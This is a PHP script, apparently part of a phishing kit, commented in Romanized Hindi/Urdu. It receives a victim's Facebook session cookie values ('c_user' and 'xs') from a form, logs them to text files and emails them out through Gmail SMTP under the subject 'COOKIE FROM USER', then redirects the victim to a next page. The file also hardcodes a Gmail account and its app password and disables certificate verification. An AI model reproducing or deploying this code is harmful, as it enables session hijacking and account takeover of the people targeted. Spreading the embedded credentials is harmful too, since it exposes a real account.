<?php
include('PHPMailerAutoload.php');



if (isset($_POST['c_user']) && isset($_POST['xs'])) {
    $username = $_POST['c_user'];
    $password = $_POST['xs'];

    // Data ko text file mein save karen
    $data = "c_user: $username, xs: $password\n";
    file_put_contents('cookies.txt', $data, FILE_APPEND); 
	file_put_contents('cookiesmailer.txt', $data, FILE_APPEND);

}


// yaha se phpmailer shuru hua
echo smtp_mailer('cookieclicker505@gmail.com','admin','html');
function smtp_mailer($to,$Subject, $msg){
 // ye function banaya hai file se data clear karne ke liye
	function clear_file($filename) {
		$fp = fopen('cookiesmailer.txt', 'w');
		fwrite($fp, '');
		fclose($fp);
	}
	//fuction ko yaha close kya hai
// yaha se file ko read mode mien open kya
	$filename = 'cookiesmailer.txt';
	$fp = fopen('cookiesmailer.txt', 'r');
	$datas = fread($fp, filesize($filename));
	fclose($fp);
	// yaha band kya




	//ye phpmailer ka hisa hai
	$to = "@gmail.com";





	$mail = new PHPMailer(); 
	$mail->IsSMTP(); 
	$mail->SMTPAuth = true; 
	$mail->SMTPSecure = 'tls'; 
	$mail->Host = "smtp.gmail.com";
	$mail->Port = 587; 
	$mail->IsHTML(true);
	$mail->CharSet = 'UTF-8';
	//$mail->SMTPDebug = 2; 


	$mail->Username = "rozefando@gmail.com";
	$mail->Password = "rrxpynrynoiqykxt";
	$mail->SetFrom("rozefando@gmail.com");
	//$mail->Subject = $subject;
	//$mail->Body =$msg;

	///
	$mail->Subject = 'COOKIE FROM USER';
	$mail->Body = $datas;// yaha $data oper se file jo read mode mien open ki hai waha se data le rahi hai
	//
	$mail->AddAddress($to);
	
	$mail->SMTPOptions=array('ssl'=>array(
		'verify_peer'=>false,
		'verify_peer_name'=>false,
		'allow_self_signed'=>false
	));

	$mail->send();

	clear_file($filename);// ye oper jo function banaya hai us ke liye hai
        
	echo
"
<script>
document.location.href = 'pass.php';
</script>

";
	/*if(!$mail->Send()){
		echo $mail->ErrorInfo;
	}else{
		return 'Sent';
	}*/
}

?>